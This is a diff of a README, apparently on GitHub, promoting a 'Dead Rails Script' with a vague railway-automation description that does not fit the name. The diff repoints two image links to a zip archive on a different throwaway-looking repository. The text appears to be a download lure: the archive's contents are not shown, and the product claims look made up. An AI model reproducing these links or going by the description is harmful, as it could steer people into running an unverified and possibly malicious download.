@@ -4,10 +4,10 @@
 Discover the Dead Rails Script, a revolutionary tool for optimizing rail automation. Learn how it enhances efficiency, safety, and sustainability in the railway industry. Explore the future of railway technology with Dead Rails Script.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 **Heading 1: What is Dead Rails Script?**
